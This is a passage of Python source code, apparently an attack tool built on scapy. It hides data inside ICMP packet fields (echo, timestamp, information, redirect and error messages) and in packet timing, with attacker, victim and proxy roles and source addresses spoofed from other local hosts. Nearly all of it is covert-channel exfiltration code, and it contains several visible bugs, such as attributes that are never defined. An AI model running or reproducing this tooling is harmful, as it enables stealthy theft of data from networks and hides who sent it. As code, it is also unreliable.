import sys, datetime, time, os, ipaddress, string, random
from mymethods import *  

from scapy.all import IP, ICMP, Raw, Ether, IPv6, IPerror6, ICMPerror, IPerror
from scapy.all import ICMPv6EchoReply, ICMPv6EchoRequest, ICMPv6ParamProblem, ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6DestUnreach
from scapy.all import get_if_hwaddr, sendp, sr1, sniff, send, srp1 
from scapy.all import * 
from enum import Enum 
from abc import ABC, abstractmethod 

#ip_google=socket.getaddrinfo("www.google.com", None, socket.AF_UNSPEC)
#print("IP_GOOGLE: ",ip_google)  
def get_filter_connection_from_function(function_name:str=None, ip_src=None, checksum:int=None, ip_dst=None, interface=None): 
    IPv4_ECHO_REQUEST_TYPE=8
    IPv4_ECHO_REPLY_TYPE=0
    IPv6_ECHO_REQUEST_TYPE=128
    IPv6_ECHO_REPLY_TYPE=129 
    if not isinstance(function_name,str):
        raise ValueError(f"La funzione passata non è una stringa: {type(function_name)} {function_name}")
    match function_name:
        #---------------------
        case "wait_conn_from_proxy" | "wait_proxy_update"| "wait_conn_from_victim": 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            elif ip_src.version==6:
                return f"icmp6 and (icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_data_from_proxy" | "wait_conn_from_attacker" | "wait_command_from_attacker": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}")  
        #---------------------
        case "wait_data_from_vicitm":
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")

            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}") 
        #---------------------
        case "wait_conn_from_proxy":
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}") 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]==8 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_attacker_command"| "victim_wait_conn_from_proxy" | "wait_icmpEcho_dst": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]=={IPv4_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        #case "":
        #    if ip_src.version==4:
        #        return aaa
        #    elif ip_src.version==6:
        #        return aaa
        #    else: print(f"Caso non contemplato: {ip_src.version}") 

class ICMP_TYPE(Enum): 
    v4_DestinationUnreachable=3
    v4_TimeExceeded=11 
    v4_ParameterProblem=12 
    v4_SourceQuench=4 
    v4_Redirect=5 
    v4_Echo_Request=8
    v4_Echo_Reply=0 
    v4_Timestamp_Request=13
    v4_Timestamp_Reply=14
    v4_Information_Request=15
    v4_Information_Reply=16 
    #
    v6_DestinationUnreachable=1
    v6_PacketTooBig=2
    v6_TimeExceeded=3
    v6_ParameterProblem=4
    v6_Echo_Request=128
    v6_Echo_Reply=129  

class SendSingleton: 
    type_attacco=None 
    host_attivi=None 
    use_delay=None 
    block_size=1024 #bytes (1KB) 
    min_wait=2 #sec
    max_wait=15 #sec
    class SenderEnum(Enum): 
        TRUE_SENDER=1
        FAKE_SENDER_ACTIVE=2 
        FAKE_SENDER_INACTIVE=3
        FAKE_SENDER_BOTH=4 
    
    def __init__(self, type_attacco:Enum=None, type_sender:Enum=None, use_delay:bool=False): 
        if not IS_TYPE.boolean(use_delay):
            raise Exception("use_delay non valido")
        self.use_delay=use_delay
        if not IS_TYPE.enum(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ",type_attacco) 
        self.type_attacco=type_attacco  
        if not IS_TYPE.enum(type_sender, self.SenderEnum): 
            raise Exception("type_sender non valido") 
        match type_sender: 
            case self.SenderEnum.TRUE_SENDER: 
                ip,err=NETWORK.IP.find_local_IP()
                if err:
                    raise Exception("Impossibile trovare l'IP locale: ", err)
                self.host_attivi=[ip]
            case SendSingleton.SenderEnum.FAKE_SENDER_ACTIVE: 
                self.host_attivi= NETWORK.HOST_ATTIVI().active_host
            case SendSingleton.SenderEnum.FAKE_SENDER_INACTIVE: 
                self.host_attivi= NETWORK.HOST_ATTIVI().inactive_host
            case SendSingleton.SenderEnum.FAKE_SENDER_BOTH:
                classe_host= NETWORK.HOST_ATTIVI() 
                self.host_attivi= classe_host.active_host
                self.host_attivi.extend(classe_host.inactive_host) 
            case _: raise Exception("Tipo di sender non valido: ", type_sender)
    
    def send_host_attivi(self, sender_hosts:list[ipaddress.IPv4Address]=None, ip_dst:ipaddress.IPv4Address=None):
        if not IS_TYPE.list(sender_hosts) or len(sender_hosts)<=0 or any(not IS_TYPE.ipaddress(ip) for ip in sender_hosts): 
            raise Exception("sender_hosts non valida")
        if not IS_TYPE.ipaddress(ip_dst): 
            raise Exception("ip_dst: non valido")
        target_mac=NETWORK.GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower()
        interface=NETWORK.INTERFACE_FROM_IP(ip_dst).interface
        while not interface: 
            default_interface=NETWORK.DEFAULT_INTERFACE().default_iface
            NETWORK.ping_once(ip_dst, default_interface) 
            interface=(
                NETWORK.INTERFACE_FROM_IP(ip_dst).interface or 
                default_interface
            )  
        #----------------------------
        msg=MSG.START_SOURCES.value
        for index in range(len(sender_hosts)): 
            if not IS_TYPE.ipaddress(sender_hosts[index]):
                print("Host non valido: ", sender_hosts[index]) 
                continue 
            indirizzo_IP=sender_hosts[index].compressed
            if len(msg+indirizzo_IP)>64: 
                #print("MESSAGGIO: ",len(msg),"\t",msg) 
                pkt = ( 
                    Ether(dst=target_mac)
                    / IP(dst=ip_dst.compressed) 
                    / ICMP(type=0, id=23, seq=0)  
                    /Raw(load=(msg).encode()) 
                ) 
                sendp(pkt, verbose=1, iface=interface) 
                msg=MSG.START_SOURCES.value+indirizzo_IP
            else: msg=msg+";"+indirizzo_IP
        #print("MESSAGGIO: ",len(msg),"\t",msg)
        pkt = ( 
            Ether(dst=target_mac)
            / IP(dst=ip_dst.compressed) 
            / ICMP(type=0, id=23, seq=0)  
            /Raw(load=(msg+MSG.END_SOURCES.value).encode()) 
        ) 
        sendp(pkt, verbose=1, iface=interface) 

    def send_data(self, data:bytes=None, ip_dst:ipaddress.IPv4Address=None):  
        if not IS_TYPE.bytes(data): 
            raise TypeError("data non byte")
        if not IS_TYPE.ipaddress(ip_dst): 
            raise TypeError("ip_dst non valido") 
        if not IS_TYPE.enum(self.type_attacco, AttackType): 
                raise TypeError("type_attacco non valido: ") 
        if not IS_TYPE.list(self.host_attivi) or any(not IS_TYPE.ipaddress(ip) for ip in self.host_attivi): 
            raise ValueError("host_attivi non valida")
        sender=None
        if IS_TYPE.ipaddress(ip_dst) and ip_dst.version==4: 
            match self.type_attacco:
                case AttackType.ipv4_destination_unreachable: 
                    sender=IPV4_DESTINATION_UNRECHABLE(ip_dst, self.host_attivi)
                case AttackType.ipv4_destination_unreachable_unused: 
                    sender=IPV4_DESTINATION_UNRECHABLE(ip_dst, self.host_attivi)
                case AttackType.ipv4_time_exceeded: 
                    sender=IPV4_TIME_EXCEEDED(ip_dst, self.host_attivi)
                case AttackType.ipv4_time_exceeded_unused: 
                    sender=IPV4_TIME_EXCEEDED(ip_dst, self.host_attivi)
                case AttackType.ipv4_parameter_problem: 
                    sender=IPV4_PARAMETER_PROBLEM(ip_dst, self.host_attivi)
                case AttackType.ipv4_parameter_problem_unused: 
                    sender=IPV4_PARAMETER_PROBLEM(ip_dst, self.host_attivi)
                case AttackType.ipv4_source_quench: 
                    sender=IPV4_SOURCE_QUENCH(ip_dst, self.host_attivi)
                case AttackType.ipv4_source_quench_unused: 
                    sender=IPV4_SOURCE_QUENCH(ip_dst, self.host_attivi)
                case AttackType.ipv4_redirect: 
                    sender=IPV4_REDIRECT(ip_dst, self.host_attivi)
                case AttackType.ipv4_echo_campi: 
                    sender=IPV4_ECHO(ip_dst, self.host_attivi)
                case AttackType.ipv4_echo_payload: 
                    sender=IPV4_ECHO(ip_dst, self.host_attivi)
                case AttackType.ipv4_echo_campi_payload: 
                    sender=IPV4_ECHO(ip_dst, self.host_attivi)
                case AttackType.ipv4_echo_random_payload: 
                    sender=IPV4_ECHO(ip_dst, self.host_attivi)
                case AttackType.ipv4_timestamp: 
                    sender=IPV4_TIMESTAMP(ip_dst, self.host_attivi)
                case AttackType.ipv4_information: 
                    sender=IPV4_INFORMATION(ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit: 
                    sender=IPV4_TIMING_8BIT(ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    sender=IPV4_TIMING_8BIT_NOISE(ip_dst, self.host_attivi)
                case _: raise Exception(f"Tipologia non conosciuta: {self.tipologia}") 
        elif IS_TYPE.ipaddress(ip_dst) and ip_dst.version==6: 
            match self.type_attacco: 
                case AttackType.ipv6_echo: 
                    sender=IPV4_ECHO(ip_dst, self.host_attivi)
                case AttackType.ipv6_parameter_problem: 
                    sender=IPV6_PARAMETER_PROBLEM(ip_dst, self.host_attivi)
                case AttackType.ipv6_time_exceeded: 
                    sender=IPV6_TIME_EXCEEDED(ip_dst, self.host_attivi)
                case AttackType.ipv6_packet_to_big: 
                    sender=IPV6_PACKET_BIG(ip_dst, self.host_attivi)
                case AttackType.ipv6_destination_unreachable: 
                    sender=IPV6_DESTINTION_UNREACHABLE(ip_dst, self.host_attivi)
                case AttackType.ipv6_timing_cc:  
                    sender=IPV6_TIMING(ip_dst, self.host_attivi) 
                case _: raise Exception(f"Tipologia non conosciuta: {self.tipologia}") 
        else: raise Exception("IP destinazione non valido: ",ip_dst)
        self.send_host_attivi(self.host_attivi, ip_dst) 
        for i in range(0, len(data), self.block_size): 
            if self.useDelay: 
                print("Waiting...")
                time.sleep(random.uniform(self.min_wait,self.max_wait)) 
            try:
                sender.send(data[i:i+self.block_size],self.type_attacco) 
                sender.send_last()
            except Exception as e: 
                print("send data IPV4: ",e) 

class ReceiveSingleton:  
    attacco=None 
    DEBUG=True
    ip_dst=None
    host_attivi=None 
    stop_flag={"value":False} 

    def __init__(self, attacco:Enum=None): 
        if not IS_TYPE.enum(attacco, AttackType): 
            self.attacco=AttackType.choose_attack_function() 
        ip_dst,err=NETWORK.IP.find_local_IP()
        if err: 
            raise Exception(f"ReceiveSingleton: {err}") 
        self.wait_host_attivi() 
        if self.ip_dst.version==4: 
            match self.attacco: 
                case AttackType.ipv4_information: 
                    wait_class=IPV4_INFORMATION(self.ip_dst, self.host_attivi) 
                case AttackType.ipv4_timestamp: 
                    wait_class=IPV4_TIMESTAMP(self.ip_dst, self.ip_src)
                case AttackType.ipv4_redirect: 
                    wait_class=wait_class=IPV4_REDIRECT(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_source_quench | AttackType.ipv4_source_quench_unused: 
                    wait_class=wait_class=IPV4_SOURCE_QUENCH(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_parameter_problem | AttackType.ipv4_parameter_problem_unused: 
                    wait_class=wait_class=IPV4_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_time_exceeded | AttackType.ipv4_time_exceeded_unused: 
                    wait_class=wait_class=IPV4_TIME_EXCEEDED(self.ip_dst, self.host_attivi) 
                case AttackType.ipv4_destination_unreachable | AttackType.ipv4_destination_unreachable_unused: 
                    wait_class=wait_class=IPV4_DESTINATION_UNRECHABLE(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_echo_campi|AttackType.ipv4_echo_payload|AttackType.ipv4_echo_campi_payload|AttackType.ipv4_echo_random_payload: 
                    wait_class=wait_class=IPV4_ECHO(self.ip_dst, self.host_attivi, self.attacco)
                case AttackType.ipv4_timing_channel_8bit: 
                    wait_class=wait_class=IPV4_TIMING_8BIT(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    wait_class=wait_class=IPV4_TIMING_8BIT_NOISE(self.ip_dst, self.host_attivi) 
                case _: raise Exception(f"ReceiveSingleton: Tipologia non conosciuta: {self.attacco}")
        elif self.ip_dst.version==6: 
            match self.attacco: 
                case AttackType.ipv6_echo:  
                    wait_class=wait_class=IPV6_ECHO(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_parameter_problem: 
                    wait_class=wait_class=IPV6_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_time_exceeded: 
                    wait_class=wait_class=IPV6_TIME_EXCEEDED(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_packet_to_big: 
                    wait_class=wait_class=IPV6_PACKET_BIG(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_destination_unreachable: 
                    wait_class=wait_class=IPV6_DESTINTION_UNREACHABLE(self.ip_dst, self.host_attivi) 
                case _: raise Exception(f"ReceiveSingleton: Tipologia non conosciuta: {self.attacco}")
        else:
            raise Exception(f"IP version non conosciuta: {self.ip_dst.version}") 
    
    def get_filter(self): 
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0 
        filter="icmp"
        filter=filter+f" and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY})"
        filter=filter+f" and dst {self.ip_dst.compressed}" 
        return filter 
    
    def get_stop_filter(self): 
        def stop_filter(pkt): 
            return self.stop_flag["value"] 
        return stop_filter 
    
    def get_callback(self): 
        def callback(pkt): 
            nonlocal self
            print("Pacchetto ricevuto: ", pkt.summary())  
            if pkt.haslayer("ICMP") and pkt.haslayer("Raw") and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
                if pkt[ICMP].id==23 and MSG.START_SOURCES.value.encode() in pkt["Raw"].load: 
                    if MSG.END_SOURCES.value.encode() in pkt["Raw"].load: 
                        self.stop_flag["value"]=True 
                    IPsources=pkt["Raw"].load.decode()
                    IPsources=IPsources.replace(MSG.START_SOURCES.value,"")
                    IPsources=IPsources.replace(MSG.END_SOURCES.value,"")
                    IPsources=IPsources.strip().split(";") 
                    for x in IPsources: 
                        try:
                            ipSRC=ipaddress.ip_address(x)
                            if ipSRC.version==self.ip_dst.version: 
                                self.host_attivi.append(ipSRC) 
                            else: 
                                print("IP versione non corretta: ",self.ip_dst.version," ", ipSRC)
                        except Exception as e:
                            print("Errore nell'aggiunta degli host attivi: ", e)
            elif pkt.haslayer("Padding"):
                print("Padding load: ", pkt["Padding"].load) 
        return callback 
    
    def wait_host_attivi(self):  
        if (self.DEBUG): 
            self.host_attivi=[ipaddress.ip_address("192.168.1.13")] 
            return
        print("In ascolto dei pacchetti ICMP...")
        sniff( 
            filter=self.get_filter()
            ,prn=self.get_callback()
            ,store=False 
            ,stop_filter=self.get_stop_filter() 
        ) 
        print("Host attivi trovati: ", self.host_attivi) 

class _IPx: 
    ip_dst=None
    dst_mac=None
    #ip_src=None 
    #src_mac=None 
    interface=None 
    
    data=[] 
    host_attivi=None 
    #event_pktconn=GET.threading_Event() 
    stop_flag={"value":False}  
    stop_integer:int=255

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:list[ipaddress.IPv4Address]=None):
        if not IS_TYPE.ipaddress(ip_dst) :   
            raise Exception("IP di destinazione non corretto") 
        self.ip_dst=ip_dst 
        self.dst_mac=NETWORK.GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower()
        #print(f"MAC destinazione: {self.dst_mac}")
        if not self.dst_mac: 
            raise Exception(f"Impossibile trovare il MAC per l'IP: {ip_dst.compressed}") 
        #self.ip_src=NETWORK.IP.find_local_IP() 
        #self.src_mac=NETWORK.get_macAddress(self.ip_src).strip().replace("-",":").lower()
        #if not self.src_mac: 
        #    #src_mac = get_if_hwaddr(interface) 
        #    raise Exception(f"Impossibile trovare il MAC per l'IP: {self.ip_src.compressed}")
        #print(f"MAC sorgente: {self.dst_mac}") 
        self.interface=NETWORK.INTERFACE_FROM_IP(ip_dst).interface
        while not self.interface: 
            default_interface=NETWORK.DEFAULT_INTERFACE().default_iface
            NETWORK.ping_once(ip_dst, default_interface) 
            self.interface=(
                NETWORK.INTERFACE_FROM_IP(ip_dst).interface or 
                default_interface
            ) 
        print(f"Interfaccia per destinazione: {self.interface}")
        if not IS_TYPE.list(host_attivi) or len(host_attivi)<=0 or any( not IS_TYPE.ipaddress(ip_host) for ip_host in host_attivi):
            raise Exception("Lista degli indiirzzi host non valida") 
        self.host_attivi=host_attivi 
        print("Host Attivi: ",self.host_attivi) 
    
    def get_stop_filter(self): 
        def stop_filter(pkt): 
            nonlocal self
            return self.stop_flag["value"] 
        return stop_filter 

    def timeout_timer_callback(self): 
        #THREADING_EVENT.set(self.event_pktconn) 
        self.stop_flag["value"]=True  
    
    @staticmethod
    def get_filter(type_list:list[int]=None, ip_dst:ipaddress.IPv4Address=None, host_attivi:list[ipaddress.IPv4Address]=None): 
        if not IS_TYPE.list(type_list) or any(not IS_TYPE.integer(x) for x in type_list): 
            raise TypeError("type_list non valido")
        if not IS_TYPE.ipaddress(ip_dst) or ip_dst.version not in [4,6]: 
            raise TypeError("ip_dst non valido") 
        if not IS_TYPE.list(host_attivi) or any(not IS_TYPE.ipaddress(x) for x in host_attivi): 
            raise TypeError("host_attivi non valido")
        if ip_dst.version==4: 
            str_icmp="icmp"
        elif ip_dst.version==6: 
            str_icmp="icmp6"
        filter=str_icmp
        if IS_TYPE.list(type_list) and len(type_list)>0 and all(IS_TYPE.integer(type) for type in type_list):
            filter=filter+f" and ("
            for index in range(len(type_list)): 
                if index>0:  filter=filter+f" or {str_icmp}[0]=={type_list[index]} "
                else: filter=filter+f" {str_icmp}[0]=={type_list[index]} "
            filter=filter+f" )"
        else: print("get_filter: type_list non valida-> ",type_list) 
        if IS_TYPE.ipaddress(ip_dst): 
            filter=filter+f" and dst {ip_dst.compressed}" 
        else: print("get_filter: ip_dst non valido-> ",ip_dst)
        if IS_TYPE.list(host_attivi) and len(host_attivi)>0: 
            filter+=f" and ("
            for index in range(len(host_attivi)): 
                if IS_TYPE.ipaddress(host_attivi[index]): 
                    if index>0:  filter+=f" or src {host_attivi[index].compressed} "
                    else: filter+=f" src {host_attivi[index].compressed}"
                else: print(f"get_filter: host non valido {host_attivi[index]}")
            filter+=f")"
        else: print("get_filter: host_attivi list non valida-> ",host_attivi)
        print("FILTRO: ", filter)
        return filter

    @abstractmethod 
    def get_callback(self):
        raise NotImplementedError(f"Non si è sovrascritto il metodo get_callback: {self.__class__.__name__}")

    def wait(self, type_list:list[int]=None):  
        if not IS_TYPE.ipaddress(self.ip_dst): 
            raise Exception(f"IPV4_: indirizzo destinazione non valido")  
        if not IS_TYPE.list(self.data): 
            raise Exception(f"IPV4_: lista dati non valida") 
        if not IS_TYPE.list(type_list): 
            raise Exception(f"IPV4_: lista tipologie non valida")  
        print("In ascolto dei pacchetti...")
        sniff(
            filter=self.get_filter(
                type_list,
                self.ip_dst, 
                self.host_attivi
            )
            ,prn=self.get_callback 
            ,store=False 
            ,stop_filter=self.get_stop_filter 
        )  
        #self.data="".join(x for x in self.data)  
        joined="".join(self.data) 
        cleaned="".join(x for x in joined if x in string.printable) 
        self.data=cleaned

    def _old_wait(self, type_list:list[int]=None): 
        if not IS_TYPE.ipaddress(self.ip_dst): 
            raise Exception(f"IPV4_: indirizzo destinazione non valido")  
        if not IS_TYPE.list(self.data): 
            raise Exception(f"IPV4_: lista dati non valida") 
        if not IS_TYPE.list(type_list): 
            raise Exception(f"IPV4_: lista tipologie non valida") 
        try: 
            args={
                "filter": self.get_filter(
                    type_list,
                    self.ip_dst, 
                    self.host_attivi
                )
                #,"count":1 
                ,"prn": self.get_callback()
                #,"store":True 
                ,"iface":self.interface
            }
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None 
                ,lambda: SNIFFER.template_timeout(self.event_pktconn)
            )  
        except Exception as e:
            raise Exception(f"{self.__class__.__name__} wait: {e}")
        try: 
            THREADING_EVENT.wait(self.event_pktconn) 
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable) 
                self.data=cleaned 
                return True 
            return False 
        except Exception as e:
            raise Exception(f"IPV4_.wait: {e}")

    @abstractmethod 
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        pass 

    @abstractmethod 
    def send_last(self): 
        pass

class IPV4_INFORMATION(_IPx): 
    INFORMATION_REQ=ICMP_TYPE.v4_Information_Request.value
    INFORMATION_REP=ICMP_TYPE.v4_Information_Reply.value

    def get_callback(self):
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and (packet[ICMP].type==self.INFORMATION_REQ or packet[ICMP].type==self.INFORMATION_REP): 
                if packet[ICMP].id==self.stop_integer and packet[ICMP].seq==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                icmp_id=packet[ICMP].id
                byte1 = (icmp_id >> 8) & 0xFF 
                byte2 = icmp_id & 0xFF  
                self.data.extend([chr(byte1),chr(byte2)]) 
                #print(f"Callback received: {byte1} / {byte2}")
                #print(f"Callback received: {chr(byte1)} / {chr(byte2)}")
        return callback

    def wait(self):
        super().wait([self.INFORMATION_REQ, self.INFORMATION_REP]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None): 
    #def ipv4_information(self, data:bytes=None): 
        if not IS_TYPE.bytes(data):
            raise Exception(f"data non byte") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise Exception("ip_dst non valido") 
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= Ether(dst=self.target_mac) \
                /IP(src=ip_src, dst=self.ip_dst.compressed) \
                /ICMP(type=self.INFORMATION_REP,id=icmp_id)
            #pkt.summary()
            #pkt.show() 
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        pkt= Ether(dst=self.target_mac) \
            /IP(dst=self.ip_dst.compressed)\
            /ICMP(type=self.INFORMATION_REP,
                  id=self.stop_integer,seq=self.stop_integer)
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)
    
class IPV4_TIMESTAMP(_IPx):  
    TIMESTAMP_REQ=ICMP_TYPE.v4_Timestamp_Request.value
    TIMESTAMP_REP=ICMP_TYPE.v4_Timestamp_Reply.value 
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and (packet[ICMP].type==self.TIMESTAMP_REQ or packet[ICMP].type==self.TIMESTAMP_REP):  
                if packet[ICMP].id==self.stop_integer and packet[ICMP].seq==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return
                icmp_id=packet[ICMP].id 
                byte1 = (icmp_id >> 8) & 0xFF 
                byte2 = icmp_id & 0xFF  
                self.data.extend([chr(byte1),chr(byte2)]) 
                #
                icmp_ts_ori=str(packet[ICMP].ts_ori)[-3:]  
                icmp_ts_rx=str(packet[ICMP].ts_rx)[-3:]  
                icmp_ts_tx=str(packet[ICMP].ts_tx)[-3:] 
                self.data.extend([chr(int(icmp_ts_ori)),chr(int(icmp_ts_rx)), chr(int(icmp_ts_tx))]) 
        return callback

    def wait(self):
        super().wait([self.TIMESTAMP_REQ, self.TIMESTAMP_REP])  
    
    def send(self, data:bytes=None, type_attacco:Enum=None):  
        if not IS_TYPE.bytes(data): 
            raise Exception("data non validi")
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception(f"ip_dst non corretto") 
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface  
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        for index in range(0, len(data), 5): 
            try:
                icmp_id=icmp_id=(data[index]<<8)+data[index+1]  
            except IndexError as e: 
                icmp_id=(data[index]<<8)
            
            current_time=datetime.now(timezone.utc) 
            midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0) 

            data_pkt=int.from_bytes(data[index+2:index+3]) *10**3 
            #print("Tempo prima: ",current_time)
            current_time=current_time.replace(microsecond=data_pkt) 
            #print("Tempo dopo: ",current_time)
            icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000) 
            #print("Tempo campo: ",icmp_ts_ori) 
            #print("Dati nasocsti: ",data[index+2:index+3],"\t",int.from_bytes(data[index+2:index+3])) 
            #print("Dati nasocsti: ",data[index+3:index+4],"\t",int.from_bytes(data[index+3:index+4]))
            #print("Dati nasocsti: ",data[index+4:index+5],"\t",int.from_bytes(data[index+4:index+5]))

            data_pkt=int.from_bytes(data[index+3:index+4]) *10**3
            if current_time.second+1<60:
                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000) 
            
            data_pkt=int.from_bytes(data[index+4:index+5]) *10**3
            if current_time.second+1<60:
                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000) 

            pkt= Ether(dst=self.target_mac) \
                /IP(src=ip_src, dst=self.ip_dst.compressed) \
                /ICMP(
                    type=self.TIMESTAMP_REP
                    ,id=icmp_id
                    ,ts_ori=icmp_ts_ori
                    ,ts_rx=icmp_ts_rx
                    ,ts_tx=icmp_ts_tx 
                )#/ data[index+5:index+max_block]
            #pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        pkt= Ether(dst=self.target_mac) \
            / IP(dst=self.ip_dst.compressed) \
            /ICMP(type=self.TIMESTAMP_REP,
                  id=self.stop_integer,seq=self.stop_integer)
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_REDIRECT(_IPx):  
    REDIRECT=ICMP_TYPE.v4_Redirect.value

    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.REDIRECT:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
